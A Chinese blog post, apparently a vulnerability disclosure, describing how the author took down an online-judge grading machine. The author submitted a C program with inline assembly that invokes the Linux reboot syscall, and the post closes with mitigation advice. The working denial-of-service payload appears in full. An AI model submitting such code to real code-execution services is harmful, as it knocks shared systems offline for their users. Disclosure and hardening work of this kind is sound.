0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-slash"><circle cx="12" cy="12" r="10"></circle><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"></line></svg></span><span>小黑屋</span></a></li><li> <a target="_blank" href="https://stat.imwxz.cn/" class="auto"><span class="nav-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-activity"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg></span><span>监控</span></a></li><li> <a target="_self" href="https://www.imwxz.com/feed/" class="auto"><span class="nav-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></span><span>订阅</span></a></li>                              <!-- DIY END -->
+              <!--友情链接-->
+              <li>
+                <a class="auto">
+                  <span class="pull-right text-muted">
+                    <i class="fontello icon-fw fontello-angle-right text"></i>
+                    <i class="fontello icon-fw fontello-angle-down text-active"></i>
+                  </span>
+                    <span class="nav-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-user"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg></span>
+                  <span>友链</span>
+                </a>
+                <ul class="nav nav-sub dk">
+                  <li class="nav-sub-header">
+                    <a data-no-instant="">
+                      <span>友链</span>
+                    </a>
+                  </li>
+                  <li data-original-title="内页链接" data-toggle="tooltip" data-placement="top"><a rel="noopener" href="https://www.imwxz.com/links.html" target="_self"><span>内页链接</span></a></li>
+                  <!--使用links插件，输出全站友链-->
+                 <li data-original-title="永远的母校" data-toggle="tooltip" data-placement="top"><a rel="noopener" href="http://61.155.62.52/yzzx/" target="_blank"><span>YZZX</span></a></li><li data-original-title="永远的母校" data-toggle="tooltip" data-placement="top"><a rel="noopener" href="http://www.sjtu.edu.cn/" target="_blank"><span>SJTU</span></a></li><li data-original-title="666" data-toggle="tooltip" data-placement="top"><a rel="noopener" href="https://wensun.today/" target="_blank"><span>HermitSun</span></a></li>                </ul>
+              </li>
+                            </ul>
+          </nav>
+          <!-- nav -->
+        </div>
+          <!--end of .navi-wrap-->
+          <!--left_footer-->
+                    <div id="left_footer" class="footer wrapper-xs text-center nav-xs lt">
+                  
+                                    <div class="col-xs-6 no-padder">
+                      <a target="_blank" class="tinav" href="https://www.imwxz.com/feed/" title="" data-toggle="tooltip" data-placement="top" data-original-title="文章RSS地址">
+                          <span class="left-bottom-icons block"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></span>
+                          <small class="text-muted">文章</small>
+                      </a>
+                  </div>
+                  <div class="col-xs-6 no-padder">
+                      <a target="_blank" href="https://www.imwxz.com/feed/comments/" title="" data-toggle="tooltip" data-placement="top" data-original-title="评论RSS地址">
+                          <span class="left-bottom-icons block"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-message-square"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg></span>
+                          <small class="text-muted">评论</small>
+                      </a>
+                  </div>
+          </div>
+          
+      </div><!--.aside-wrap-->
+  </aside>
+<!-- content -->
+<div id="content" class="app-content">
+    <!--loading animate-->
+    <div id="loading" class="butterbar active hide">
+            <span class="bar"></span>
+        </div>
+
+
+
+
+
+	<!-- / aside -->
+<style>
+    #post-content{
+        font-size: 14px;
+    }
+</style>
+<!-- <div id="content" class="app-content"> -->
+   <a class="off-screen-toggle hide"></a>
+   <main class="app-content-body ">
+    <div class="hbox hbox-auto-xs hbox-auto-sm">
+    <!--文章-->
+     <div class="col center-part">
+         <!--生成分享图片必须的HTML结构-->
+                 <style>
+        
+        .mdx-si-head .cover{
+            object-fit: cover;
+            width: 100%;
+            height: 100%
+        }
+        
+</style>
+<div class="mdx-share-img" id="mdx-share-img"><div class="mdx-si-head" style="background-image:url(https://static.imwxz.cn/assets/img/video.jpg)"><p>imwxz</p><span>某OJ系统恶意代码执行漏洞</span></div><div class="mdx-si-sum">
+今天刚刚测试发现某OJ系统存在恶意代码执行漏洞，鉴于其危害性，本人将在管理员修复漏洞后公开细节。
+</div><div class="mdx-si-box"><span>扫描右侧二维码阅读全文</span><div class="mdx-si-qr" id="mdx-si-qr"><img src="%E6%9F%90OJ%E7%B3%BB%E7%BB%9F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20-%20Matrix_files/GetCode.png"></div></div><div class="mdx-si-time">24<br><span class="mdx-si-time-2">2017/10</span></div></div>    <!--标题下的一排功能信息图标：作者/时间/浏览次数/评论数/分类-->
+      
+        <header id="small_widgets" class="bg-light lter wrapper-md">
+             <h1 class="entry-title m-n font-thin text-black l-h">某OJ系统恶意代码执行漏洞<a class="plus-font-size" data-toggle="tooltip" data-original-title="点击改变文章字体大小"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-type"><polyline points="4 7 4 4 20 4 20 7"></polyline><line x1="9" y1="20" x2="15" y2="20"></line><line x1="12" y1="4" x2="12" y2="20"></line></svg></a><a class="speech-button m-l-sm superscript" data-toggle="tooltip" data-original-title="朗读文章" style="display: none;"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-play-circle"><circle cx="12" cy="12" r="10"></circle><polygon points="10 8 16 12 10 16 10 8"></polygon></svg></a><span class="morphing-btn-wrap "><a data-morphing="" id="morphing" data-src="#morphing-content" href="javascript:;" class="read_mode superscript m-l-sm morphing-btn" data-toggle="tooltip" data-placement="right" data-original-title="阅读模式"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-book-open"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"></path><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"></path></svg></a></span><div class="morphing-btn-clone" style="display: none;"></div></h1>       <!--文章标题下面的小部件-->
+                  <ul class="entry-meta text-muted list-inline m-b-none small
+             post-head-icon">
+             <!--作者-->
+             <li class="meta-author"><span class="post-icons"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-user"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg></span><span class="sr-only">博主：</span> <a class="meta-value" href="https://www.imwxz.com/author/1/" rel="author"> imwxz</a></li>
+             <!--发布时间-->
+             <li class="meta-date"><span class="post-icons"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg></span><span class="sr-only">发布时间：</span><time class="meta-value">2017 年 10 月 24 日</time></li>
+             <!--浏览数-->
+             <li class="meta-views"><span class="post-icons"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-eye"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg></span><span class="meta-value">2885位小伙伴来过</span></li>
+                              <!--评论数-->
+                 <li class="meta-comments"><span class="post-icons"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-message-circle"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path></svg></span><a class="meta-value" href="#comments">木有评论</a></li>
+             
+             <!--文字数目-->
+             <li class="meta-word"><span class="post-icons"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-pen-tool"><path d="M12 19l7-7 3 3-7 7-3-3z"></path><path d="M18 13l-1.5-7.5L2 2l3.5 14.5L13 18l5-5z"></path><path d="M2 2l7.586 7.586"></path><circle cx="11" cy="11" r="2"></circle></svg></span><span class="meta-value">1371字数</span></li>
+             <!--分类-->
+             <li class="meta-categories"><span class="post-icons"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-hash"><line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line></svg></span><span class="sr-only">分类：</span> <span class="meta-value"><a href="https://www.imwxz.com/category/crack_0day/">漏洞公开</a></span></li>
+         </ul>
+      </header>
+      <div class="wrapper-md" id="post-panel">
+	   <ol class="breadcrumb bg-white-pure" itemscope=""><li>
+                 <a href="https://www.imwxz.com/" itemprop="breadcrumb" title="" data-toggle="tooltip" data-original-title="返回首页"><span class="home-icons"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg></span>首页</a>
+             </li><li class="active">正文&nbsp;&nbsp;</li></ol>       <!--博客文章样式 begin with .blog-post-->
+       <div id="postpage" class="blog-post">
+        <article class="single-post panel">
+        <!--文章页面的头图-->
+                 <!--文章内容-->
+         <div id="post-content" class="wrapper-lg">
+             
+             <div class="entry-content l-h-2x" id="md_handsome_origin" click_status="true"><p></p><div class="tip inlineBlock warning">
+
+本帖所包含的内容仅限技术交流和学习研究使用，禁止用于其他用途！因使用不当造成的一切后果与本人无关！
+</div><p></p>
+<p>今天刚刚测试发现某OJ系统存在恶意代码执行漏洞，鉴于其危害性，本人将在管理员修复漏洞后公开细节。</p>
+<!--more-->
+<ul>
+<li>目标：某OJ评测系统评测机</li>
+<li>目的：卡死评测机或瘫痪整个服务器</li>
+<li>严重性：紧急</li>
+</ul>
+<hr>
+<h2 id="_6">0x01：试探</h2>
+<p>由于OJ都设置了TLE时间，因此试图通过死循环之类程序中的时间占用卡死评测机是不可能的，但是编译时间一般没有限制，因此我们先从编译入手，来尝试</p>
+<pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;con&gt;</span></span></code></pre>
+<p>这个常见的坑爹代码。<br>
+很不幸，结果CE了，File not find，看来管理员对这个还是有一定了解，提前删掉了这个文件。<br>
+然后就是常见的文件操作，更不幸，作者在此项目的开源wiki上已经说明</p>
+<blockquote>
+<p>一切企图读入服务器上其他文件的请求将被评测系统拒绝</p>
+</blockquote>
+<p>那我就不费那个功夫了……</p>
+<h2 id="_12">0x02：BUG出现</h2>
+<p>原本打算通过写一大堆模板增加编译时间，不过考虑到有提交大小限制也没什么可能实现，那么我们可不可以通过执行恶意代码来干掉评测机呢？<br>
+C/C++中有一个比较少用的特性，就是可以使用asm关键字直接在程序中插入汇编代码，刚好之前看逆向的时候看到过一个有趣的Linux汇编断电代码，扔到这里来试试。</p>
+<pre><code class="hljs properties"><span class="hljs-attr">int</span> <span class="hljs-string">main(){</span>
+    <span class="hljs-attr">__asm{</span>
+    <span class="hljs-attr">mov</span> <span class="hljs-string">0x4321fedc,edx</span>
+    <span class="hljs-attr">mov</span> <span class="hljs-string">0x5121996,ecx</span>
+    <span class="hljs-attr">mov</span> <span class="hljs-string">0xfee1dead,ebx</span>
+    <span class="hljs-attr">mov</span> <span class="hljs-string">0x58,eax</span>
+    <span class="hljs-attr">int</span> <span class="hljs-string">0x80</span>
+    <span class="hljs-attr">}</span>
+    <span class="hljs-attr">return</span> <span class="hljs-string">0;</span>
+<span class="hljs-attr">}</span></code></pre>
+<p>提交！蛤？CE了？？唔……这不科学啊，就算被屏蔽掉也不会是CE啊……错误信息：</p>
+<pre><code class="hljs less"><span class="hljs-attribute">error</span>: expected <span class="hljs-string">'('</span> before <span class="hljs-string">'{'</span> token __asm{</code></pre>
+<p>这个似乎表明g++并不支持这个关键字……好吧，VS用多了……我改！</p>
+<pre><code class="hljs perl"><span class="hljs-keyword">int</span> main(){
+    __asm_<span class="hljs-number">_</span>(<span class="hljs-string">"movl $0x4321FEDC,%edx"</span>);
+    __asm_<span class="hljs-number">_</span>(<span class="hljs-string">"movl $85072278,%ecx"</span>);
+    __asm_<span class="hljs-number">_</span>(<span class="hljs-string">"movl $0xfee1dead,%ebx"</span>);
+    __asm_<span class="hljs-number">_</span>(<span class="hljs-string">"movl $88,%eax"</span>);
+    __asm_<span class="hljs-number">_</span>(<span class="hljs-string">"int $0x80"</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre>
+<p>提交！哈！成功地把OJ卡到了【正在评测】状态，看来评测机已经被断电了吧O(∩_∩)O<br>
+这个OJ还没有并行处理，不一会儿就刷出了一片等待评测……<br>
+至此成功将评测机断电~</p>
+<h2 id="_20">0x03：解决方法</h2>
+<ol>
+<li>评测机一定要和web隔离，这样出了事情也好通告</li>
+<li>敏感关键词提交时就要进行过滤，确保大部分恶意代码不会混进去</li>
+<li>评测环境的权限设置要规范，最好只给编译的程序最小运行权限</li>
+<li>编译环境隔离是最好的解决办法，整个虚拟机，到时候真出事了直接恢复快照</li>
+</ol></div>
+
+                          <!--文章的页脚部件：打赏和其他信息的输出-->
+             <div class="show-foot"><div class="notebook">
+                     <i class="fontello fontello-clock-o"></i>
+                     <span>最后修改：2019 年 07 月 06 日 01 : 49  AM</span>
+                 </div><div class="copyright" data-toggle="tooltip" data-html="true" data-original-title="转载请保留本文转载地址，著作权归作者所有"><span>© 允许规范转载</span>
+                 </div>
+             </div>
+                                      <!--打赏模块-->
+                 
+             <div class="support-author">
+                 <button id="support_author" data-toggle="modal" data-target="#myModal" class="btn btn-pay btn-danger btn-rounded"><i class="fontello fontello-wallet" aria-hidden="true"></i>&nbsp;赞赏</button>
+                 <div class="mt20 text-center article__reward-info">
+                     <span class="mr10">如果觉得我的文章对你有用，请随意赞赏</span>
+                 </div>
+             </div>
+             <div id="myModal" class="modal fade bs-example-modal-sm" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel">
+                 <div class="modal-dialog modal-sm" role="document">
+                     <div class="modal-content">
+                         <div class="modal-header">
+                             <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">×</span><span class="sr-only">Close</span></button>
+                             <h4 class="modal-title">赞赏作者</h4>
+                         </div>
+                         <div class="modal-body">
+                             <p class="text-center article__reward"> <strong class="article__reward-text">扫一扫支付</strong> </p>
+                             <div class="tab-content"><img nogallery="" aria-labelledby="alipay-tab" class="pay-img tab-pane fade in active" id="alipay_author" role="tabpanel" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAABS2lUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4KPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxMzggNzkuMTU5ODI0LCAyMDE2LzA5LzE0LTAxOjA5OjAxICAgICAgICAiPgogPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4KICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIi8+CiA8L3JkZjpSREY+CjwveDp4bXBtZXRhPgo8P3hwYWNrZXQgZW5kPSJyIj8+IEmuOgAAAA1JREFUCJljePfx038ACXMD0ZVlJAYAAAAASUVORK5CYII=" data-original="https://static.imwxz.com/assets/img/code_alipay.png"><img nogallery="" aria-labelledby="wechatpay-tab" class="pay-img tab-pane fade" id="wechatpay_author" role="tabpanel" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAABS2lUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4KPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxMzggNzkuMTU5ODI0LCAyMDE2LzA5LzE0LTAxOjA5OjAxICAgICAgICAiPgogPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4KICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIi8+CiA8L3JkZjpSREY+CjwveDp4bXBtZXRhPgo8P3hwYWNrZXQgZW5kPSJyIj8+IEmuOgAAAA1JREFUCJljePfx038ACXMD0ZVlJAYAAAAASUVORK5CYII=" data-original="https://static.imwxz.com/assets/img/code_wechat.png"></div>
+                             <div class="article__reward-border mb20 mt10"></div>
+
+                             <div class="text-center" role="tablist"><div class="pay-button" role="presentation"><button href="#alipay_author" id="alipay-tab" aria-controls="alipay_author" role="tab" data-toggle="tab" class="btn m-b-xs m-r-xs btn-info"><i class="iconfont icon-alipay" aria-hidden="true"></i><span>&nbsp;支付宝支付</span></button>
+                                 </div><div class="pay-button" role="presentation"><button href="#wechatpay_author" id="wechatpay-tab" aria-controls="wechatpay_author" role="tab" data-toggle="tab" class="btn m-b-xs btn-success"><i class="iconfont icon-wechatpay" aria-hidden="true"></i><span>&nbsp;微信支付</span></button>
+                                 </div></div>
+                         </div>
+                     </div>
+                 </div>
+             </div>
+                                  <!--/文章的页脚部件：打赏和其他信息的输出-->
+         </div>
+        </article>
+       </div>
+       <!--上一篇&下一篇-->
+       <nav class="m-t-lg m-b-lg">
+        <ul class="pager">
+        <li class="next"> <a class="box-shadow-wrap-normal" href="https://www.imwxz.com/annc/54.html" title="" data-toggle="tooltip" data-original-title="常在河边走，哪能不湿鞋……"> 
+下一篇 </a></li>   <li class="previous"> <a class="box-shadow-wrap-normal" href="https://www.imwxz.com/crack_0day/56.html" title="" data-toggle="tooltip" data-original-title="【转载】Typecho反序列化漏洞导致前台getshell"> 上一篇 </a></li>
+        </ul>
+       </nav>
+       <!--评论-->
+        
+    
+    
+    <div id="comments" click_status="true">
+        
+                    <!--评论列表-->
+                    
+        <!--如果允许评论，会出现评论框和个人信息的填写-->
+                    <div id="respond-post-55" class="respond comment-respond no-borders">
+
+                <h4 id="reply-title" class="comment-reply-title m-t-lg m-b">发表评论                    <small><i class="glyphicon glyphicon-info-sign" data-toggle="tooltip" data-placement="right" title="" data-original-title="使用cookie技术保留您的个人信息以便您下次快速评论，继续评论表示您已同意该条款"></i>
+                    </small>
+                    <small class="cancel-comment-reply">
+                        <a id="cancel-comment-reply-link" href="https://www.imwxz.com/crack_0day/55.html#respond-post-55" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>                    </small>
+                </h4>
+                <form id="comment_form" method="post" action="https://www.imwxz.com/crack_0day/55.html/comment" class="comment-form" role="form">
+                    <input type="hidden" name="receiveMail" id="receiveMail" value="yes">
+                    <div class="comment-form-comment form-group">
+                        <label class="padder-v-sm" for="comment">评论                            <span class="required text-danger">*</span></label>
+                        <textarea id="comment" class="textarea form-control OwO-textarea" name="text" rows="5" placeholder="说点什么吧……" onkeydown="if(event.ctrlKey&amp;&amp;event.keyCode==13){document.getElementById('submit').click();return false};"></textarea>
+                        <div class="OwO padder-v-sm">
+            <div class="OwO-logo padder-v-sm"><span class="smile-icons"><svg viewBox="0 0 24 24" width="24" height="24" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" class="css-i6dzq1"><circle cx="12" cy="12" r="10"></circle><path d="M8 14s1.5 2 4 2 4-2 4-2"></path><line x1="9" y1="9" x2="9.01" y2="9"></line><line x1="15" y1="9" x2="15.01" y2="9"></line></svg></span><span class="OwOlogotext">表情</span></div>
+            <div class="OwO-body" style="width: 100%"><div class="OwO-title"><span>OwO</span></div>
+                <ul class="OwO-items OwO-undefined OwO-items-emoticon OwO-items-show" style="max-height: 167px;">
+                    <li class="OwO-item" title="Author: DIYgod">OωO</li>
+                    <li class="OwO-item" title="Hi">|´・ω・)ノ</li>
+                    <li class="OwO-item" title="开心">ヾ(≧∇≦*)ゝ</li>
+                    <li class="OwO-item" title="星星眼">(☆ω☆)</li>
+                    <li class="OwO-item" title="掀桌">（╯‵□′）╯︵┴─┴</li>
+                    <li class="OwO-item" title="流口水">￣﹃￣</li>
+                    <li class="OwO-item" title="捂脸">(/ω＼)</li>
+                    <li class="OwO-item" title="给跪">∠( ᐛ 」∠)＿</li>
+                    <li class="OwO-item" title="Hi">(๑•̀ㅁ•́ฅ)</li>
+                    <li class="OwO-item" title="斜眼">→_→</li>
+                    <li class="OwO-item" title="加油">୧(๑•̀⌄•́๑)૭</li>
+                    <li class="OwO-item" title="有木有WiFi">٩(ˊᗜˋ*)و</li>
+                    <li class="OwO-item" title="前方高能预警">(ノ°ο°)ノ</li>
+                    <li class="OwO-item" title="我从未见过如此厚颜无耻之人">(´இ皿இ｀)</li>
+                    <li class="OwO-item" title="吓死宝宝惹">⌇●﹏●⌇</li>
+                    <li class="OwO-item" title="已阅留爪">(ฅ´ω`ฅ)</li>
+                    <li class="OwO-item" title="去吧大师球">(╯°A°)╯︵○○○</li>
+                    <li class="OwO-item" title="太萌惹">φ(￣∇￣o)</li>
+                    <li class="OwO-item" title="咦咦咦">ヾ(´･ ･｀｡)ノ"</li>
+                    <li class="OwO-item" title="气呼呼">( ง ᵒ̌皿ᵒ̌)ง⁼³₌₃</li>
+                    <li class="OwO-item" title="我受到了惊吓">(ó﹏ò｡)</li>
+                    <li class="OwO-item" title="什么鬼">Σ(っ °Д °;)っ</li>
+                    <li class="OwO-item" title="摸摸头">( ,,´･ω･)ﾉ"(´っω･｀｡)</li>
+                    <li class="OwO-item" title="无奈">╮(╯▽╰)╭ </li>
+                    <li class="OwO-item" title="脸红">o(*////▽////*)q </li>
+                    <li class="OwO-item" title="">＞﹏＜</li>
+                    <li class="OwO-item" title="">( ๑´•ω•) "(ㆆᴗㆆ)</li>
+                    <li class="OwO-item" title="">(｡•ˇ‸ˇ•｡)</li>
+                </ul>
+                <ul class="OwO-items OwO-paopao OwO-items-image" style="max-height: 167px;">
+                    <li class="OwO-item" title="呵呵" data-input="paopao:呵呵"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/呵呵.png" src="" icon="呵呵"></li>
+                    <li class="OwO-item" title="哈哈" data-input="paopao:哈哈"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/哈哈.png" src="" icon="哈哈"></li>
+                    <li class="OwO-item" title="吐舌" data-input="paopao:吐舌"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/吐舌.png" src="" icon="吐舌"></li>
+                    <li class="OwO-item" title="太开心" data-input="paopao:太开心"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/太开心.png" src="" icon="太开心"></li>
+                    <li class="OwO-item" title="笑眼" data-input="paopao:笑眼"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/笑眼.png" src="" icon="笑眼"></li>
+                    <li class="OwO-item" title="花心" data-input="paopao:花心"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/花心.png" src="" icon="花心"></li>
+                    <li class="OwO-item" title="小乖" data-input="paopao:小乖"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/小乖.png" src="" icon="小乖"></li>
+                    <li class="OwO-item" title="乖" data-input="paopao:乖"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/乖.png" src="" icon="乖"></li>
+                    <li class="OwO-item" title="捂嘴笑" data-input="paopao:捂嘴笑"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/捂嘴笑.png" src="" icon="捂嘴笑"></li>
+                    <li class="OwO-item" title="滑稽" data-input="paopao:滑稽"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/滑稽.png" src="" icon="滑稽"></li>
+                    <li class="OwO-item" title="你懂的" data-input="paopao:你懂的"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/你懂的.png" src="" icon="你懂的"></li>
+                    <li class="OwO-item" title="不高兴" data-input="paopao:不高兴"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/不高兴.png" src="" icon="不高兴"></li>
+                    <li class="OwO-item" title="怒" data-input="paopao:怒"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/怒.png" src="" icon="怒"></li>
+                    <li class="OwO-item" title="汗" data-input="paopao:汗"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/汗.png" src="" icon="汗"></li>
+                    <li class="OwO-item" title="黑线" data-input="paopao:黑线"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/黑线.png" src="" icon="黑线"></li>
+                    <li class="OwO-item" title="泪" data-input="paopao:泪"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/泪.png" src="" icon="泪"></li>
+                    <li class="OwO-item" title="真棒" data-input="paopao:真棒"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/真棒.png" src="" icon="真棒"></li>
+                    <li class="OwO-item" title="喷" data-input="paopao:喷"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/喷.png" src="" icon="喷"></li>
+                    <li class="OwO-item" title="惊哭" data-input="paopao:惊哭"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/惊哭.png" src="" icon="惊哭"></li>
+                    <li class="OwO-item" title="阴险" data-input="paopao:阴险"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/阴险.png" src="" icon="阴险"></li>
+                    <li class="OwO-item" title="鄙视" data-input="paopao:鄙视"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/鄙视.png" src="" icon="鄙视"></li>
+                    <li class="OwO-item" title="酷" data-input="paopao:酷"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/酷.png" src="" icon="酷"></li>
+                    <li class="OwO-item" title="啊" data-input="paopao:啊"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/啊.png" src="" icon="啊"></li>
+                    <li class="OwO-item" title="狂汗" data-input="paopao:狂汗"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/狂汗.png" src="" icon="狂汗"></li>
+                    <li class="OwO-item" title="what" data-input="paopao:what"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/what.png" src="" icon="what"></li>
+                    <li class="OwO-item" title="疑问" data-input="paopao:疑问"><img nogallery="" noalt="" data-original="https://www.imwxz.com/usr/themes/handsome/assets/img/emotion/paopao/疑问.png" src="" icon="疑问"></li>
